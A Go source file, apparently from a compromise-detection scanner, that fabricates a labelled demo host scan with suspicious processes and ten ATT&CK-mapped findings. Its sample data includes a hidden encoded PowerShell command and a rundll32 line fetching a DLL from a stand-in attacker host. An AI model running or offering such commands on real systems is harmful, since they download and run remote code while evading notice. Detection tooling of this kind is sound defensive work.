package main

import (
	"time"

	"github.com/FlinnZee/breachhound/internal/core"
)

// demoResult builds a fabricated, clearly-labelled "DEMO-HOST" scan that
// exercises every severity so the dashboard, gauge, and Findings views can be
// seen fully populated without needing a genuinely compromised machine.
func demoResult() scanResult {
	host := &core.HostModel{
		Hostname:    "DEMO-HOST",
		OS:          "windows",
		Elevated:    true,
		CollectedAt: time.Now(),
		Processes: []core.Process{
			{PID: 100, PPID: 88, Name: "winword.exe", Path: `C:\Program Files\Microsoft Office\winword.exe`, Signed: true, Signature: "CN=Microsoft Corporation"},
			{PID: 101, PPID: 100, Name: "powershell.exe", Path: `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`, CmdLine: "powershell -nop -w hidden -enc SQBFAFgA", Signed: true, Signature: "CN=Microsoft Windows"},
			{PID: 102, PPID: 101, Name: "update.exe", Path: `C:\Users\jdoe\AppData\Local\Temp\update.exe`, CmdLine: `"C:\Users\jdoe\AppData\Local\Temp\update.exe"`, Signed: false},
			{PID: 103, PPID: 4, Name: "svchost.exe", Path: `C:\Windows\System32\svchost.exe`, Signed: true, Signature: "CN=Microsoft Windows"},
			{PID: 104, PPID: 102, Name: "rundll32.exe", Path: `C:\Windows\System32\rundll32.exe`, CmdLine: "rundll32 http://malware-c2.example/p.dll,Start", Signed: true, Signature: "CN=Microsoft Windows"},
			{PID: 105, PPID: 88, Name: "svch0st.exe", Path: `C:\$Recycle.Bin\S-1-5-21\svch0st.exe`, Signed: false},
		},
		Connections: []core.Connection{
			{Proto: "tcp", LocalAddr: "192.168.1.20", LocalPort: 51020, RemoteAddr: "203.0.113.66", RemotePort: 443, State: "Established", PID: 102, ProcessName: "update"},
			{Proto: "tcp", LocalAddr: "192.168.1.20", LocalPort: 51021, RemoteAddr: "140.82.121.4", RemotePort: 443, State: "Established", PID: 103, ProcessName: "svchost"},
		},
		Persistence: []core.PersistenceItem{
			{Type: "run_key", Name: "Updater", Command: `C:\Users\jdoe\AppData\Local\Temp\update.exe`, Location: `HKCU:\Software\Microsoft\Windows\CurrentVersion\Run`},
			{Type: "service", Name: "Spooler", Command: `C:\Windows\System32\spoolsv.exe`, Location: "Win32_Service:Auto"},
		},
		Users: []core.LocalUser{
			{Name: "Administrator", SID: "S-1-5-21-500", Enabled: true, Admin: true, LastLogon: "2026-06-10 09:14"},
			{Name: "jdoe", SID: "S-1-5-21-1001", Enabled: true, Admin: true, LastLogon: "2026-06-14 18:02"},
			{Name: "Guest", SID: "S-1-5-21-501", Enabled: true, Admin: false},
		},
	}

	findings := []core.Finding{
		{ID: "demo-1", Title: "Connection to known-bad IP", Description: "Process \"update\" connected to known-bad IP 203.0.113.66:443.", Severity: core.SevCritical, Confidence: core.ConfHigh, Technique: "T1071", Tactic: "Command and Control", Source: "ioc", Evidence: []string{"update -> 203.0.113.66:443 (tcp)"}},
		{ID: "demo-2", Title: "Process image matches a known-bad hash", Description: "The image for \"update.exe\" (PID 102) matches a known-bad SHA-256 indicator.", Severity: core.SevCritical, Confidence: core.ConfHigh, Technique: "T1204", Tactic: "Execution", Source: "ioc", Evidence: []string{`C:\Users\jdoe\AppData\Local\Temp\update.exe`}},
		{ID: "demo-3", Title: "Document application spawned a shell", Description: "\"winword.exe\" spawned \"powershell.exe\" — a classic malicious-macro pattern.", Severity: core.SevHigh, Confidence: core.ConfHigh, Technique: "T1566.001", Tactic: "Initial Access", Source: "heuristics", Evidence: []string{"winword.exe (PID 100) -> powershell.exe (PID 101)"}},
		{ID: "demo-4", Title: "Process running from the Recycle Bin", Description: "Process \"svch0st.exe\" (PID 105) is executing from the Recycle Bin.", Severity: core.SevHigh, Confidence: core.ConfHigh, Technique: "T1036", Tactic: "Defense Evasion", Source: "heuristics", Evidence: []string{`C:\$Recycle.Bin\S-1-5-21\svch0st.exe`}},
		{ID: "demo-5", Title: "Unsigned binary executing from user-writable path", Description: "Process \"update.exe\" (PID 102) is unsigned and runs from a temp folder.", Severity: core.SevHigh, Confidence: core.ConfMedium, Technique: "T1036", Tactic: "Defense Evasion", Source: "heuristics", Evidence: []string{`C:\Users\jdoe\AppData\Local\Temp\update.exe`}},
		{ID: "demo-6", Title: "LOLBin invoked with remote download arguments", Description: "\"rundll32.exe\" was launched with arguments that fetch remote content.", Severity: core.SevHigh, Confidence: core.ConfMedium, Technique: "T1218", Tactic: "Defense Evasion", Source: "heuristics", Evidence: []string{"rundll32 http://malware-c2.example/p.dll,Start"}},
		{ID: "demo-7", Title: "Encoded PowerShell command line", Description: "PowerShell was launched with an encoded command, a common obfuscation technique.", Severity: core.SevMedium, Confidence: core.ConfMedium, Technique: "T1059.001", Tactic: "Execution", Source: "heuristics", Evidence: []string{"powershell -nop -w hidden -enc SQBFAFgA"}},
		{ID: "demo-8", Title: "Persistence entry points to a user-writable path", Description: "run_key \"Updater\" executes from a user-writable location.", Severity: core.SevHigh, Confidence: core.ConfMedium, Technique: "T1547.001", Tactic: "Persistence", Source: "heuristics", Evidence: []string{`HKCU:\...\Run`, `C:\Users\jdoe\AppData\Local\Temp\update.exe`}},
		{ID: "demo-9", Title: "Guest account is enabled", Description: "The built-in Guest account is enabled.", Severity: core.SevMedium, Confidence: core.ConfHigh, Technique: "T1078.001", Tactic: "Persistence", Source: "accounts", Evidence: []string{"Guest (SID S-1-5-21-501)"}},
		{ID: "demo-10", Title: "Built-in Administrator account is enabled", Description: "The built-in Administrator account is enabled.", Severity: core.SevLow, Confidence: core.ConfMedium, Technique: "T1078.001", Tactic: "Persistence", Source: "accounts", Evidence: []string{"Administrator (SID S-1-5-21-500)"}},
	}

	return scanResult{
		Host:     host,
		Result:   core.Score(findings, nil),
		Duration: 1742 * time.Millisecond,
	}
}
